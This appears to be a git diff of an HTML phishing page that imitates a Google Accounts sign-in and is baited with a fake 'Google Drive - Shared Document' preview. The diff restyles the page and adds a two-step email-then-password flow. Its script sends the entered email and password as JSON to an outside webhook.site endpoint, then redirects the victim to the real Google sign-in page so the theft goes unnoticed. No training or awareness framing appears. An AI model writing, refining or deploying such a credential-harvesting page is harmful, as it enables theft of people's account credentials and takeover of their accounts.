@@ -2,107 +2,119 @@
 <html lang="en">
 
 <head>
-    <meta charset="UTF-8">
-    <meta property="og:title" content="Google Drive - Shared Document">
-    <meta property="og:description" content="You’ve received a secure shared file. Please sign in to view.">
-    <meta property="og:image" content="https://ssl.gstatic.com/docs/doclist/images/infinite_arrow_favicon_5.ico">
-    <title>Sign in – Google Accounts</title>
-    <link href="https://fonts.googleapis.com/css?family=Roboto" rel="stylesheet">
-    <style>
-        body {
-            background-color: #fff;
-            font-family: 'Roboto', sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-        }
+  <meta charset="UTF-8" />
+  <meta property="og:title" content="Google Drive - Shared Document" />
+  <meta property="og:description" content="You’ve received a secure shared file. Please sign in to view." />
+  <meta property="og:image" content="https://ssl.gstatic.com/docs/doclist/images/infinite_arrow_favicon_5.ico" />
+  <title>Sign in – Google Accounts</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet" />
+  <style>
+    body {
+      background-color: #f1f1f1;
+      font-family: 'Roboto', sans-serif;
+      margin: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
 
-        .container {
-            width: 360px;
-            padding: 40px;
-            border: 1px solid #e0e0e0;
-            border-radius: 8px;
-            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
-        }
+    .container {
+      background-color: #fff;
+      padding: 40px 30px;
+      width: 100%;
+      max-width: 400px;
+      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+      border-radius: 8px;
+      text-align: center;
+    }
 
-        h1 {
-            font-size: 24px;
-            margin-bottom: 20px;
-            color: #202124;
-        }
+    .logo {
+      width: 75px;
+      margin-bottom: 20px;
+    }
 
-        input {
-            width: 100%;
-            padding: 12px;
-            margin: 10px 0;
-            border: 1px solid #dadce0;
-            border-radius: 4px;
-        }
+    h1 {
+      font-size: 24px;
+      font-weight: 400;
+      margin-bottom: 20px;
+      color: #202124;
+    }
 
-        button {
-            width: 100%;
-            padding: 12px;
-            background-color: #1a73e8;
-            color: white;
-            border: none;
-            font-weight: bold;
-            border-radius: 4px;
-            cursor: pointer;
-        }
+    input {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid #dadce0;
+      border-radius: 4px;
+      font-size: 14px;
+    }
 
-        .step2 {
-            display: none;
-        }
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #1a73e8;
+      color: white;
+      border: none;
+      font-weight: bold;
+      border-radius: 4px;
+      font-size: 14px;
+      cursor: pointer;
+    }
 
-        .logo {
-            width: 75px;
-            display: block;
-            margin: 0 auto 30px;
-        }
+    .step2 {
+      display: none;
+    }
 
-        small {
-            color: #5f6368;
-            font-size: 12px;
-        }
-    </style>
+    small {
+      display: block;
+      margin-top: 20px;
+      font-size: 12px;
+      color: #5f6368;
+    }
+  </style>
 </head>
 
 <body>
-    <div class="container">
-        <img src="https://ssl.gstatic.com/accounts/ui/avatar_2x.png" alt="Google Logo" class="logo">
-        <form onsubmit="return nextStep(event)">
-            <div class="step1">
-                <h1>Sign in</h1>
-                <input type="email" id="email" placeholder="Email or phone" required>
-                <button type="submit">Next</button>
-            </div>
-            <div class="step2">
-                <h1>Welcome</h1>
-                <input type="password" id="password" placeholder="Enter your password" required>
-                <button type="button" onclick="sendData()">Sign In</button>
-            </div>
-            <small>Not your computer? Use Guest mode to sign in privately. <a href="#">Learn more</a></small>
-        </form>
-    </div>
+  <div class="container">
+    <img class="logo" src="https://ssl.gstatic.com/accounts/ui/avatar_2x.png" alt="Google Logo" />
+    <form onsubmit="return nextStep(event)">
+      <div class="step1">
+        <h1>Sign in</h1>
+        <input type="email" id="email" placeholder="Email or phone" required />
+        <button type="submit">Next</button>
+      </div>
+      <div class="step2">
+        <h1>Welcome</h1>
+        <input type="password" id="password" placeholder="Enter your password" required />
+        <button type="button" onclick="sendData()">Sign in</button>
+      </div>
+      <small>Not your computer? Use Guest mode to sign in privately. <a href="#">Learn more</a></small>
+    </form>
+  </div>
 
-    <script>
-function sendData() {
-  const email = document.getElementById('email').value;
-  const pass = document.getElementById('password').value;
+  <script>
+    function nextStep(e) {
+      e.preventDefault();
+      document.querySelector('.step1').style.display = 'none';
+      document.querySelector('.step2').style.display = 'block';
+    }
 
-  fetch("https://webhook.site/YOUR_WEBHOOK_ID", {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json"
-    },
-    body: JSON.stringify({ email: email, password: pass })
-  }).then(() => {
-    window.location.href = "https://accounts.google.com/signin";
-  });
-}
+    function sendData() {
+      const email = document.getElementById('email').value;
+      const pass = document.getElementById('password').value;
 
-    </script>
+      fetch("https://webhook.site/YOUR_WEBHOOK_ID", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({ email: email, password: pass })
+      }).then(() => {
+        window.location.href = "https://accounts.google.com/signin";
+      });
+    }
+  </script>
 </body>
 
 </html>
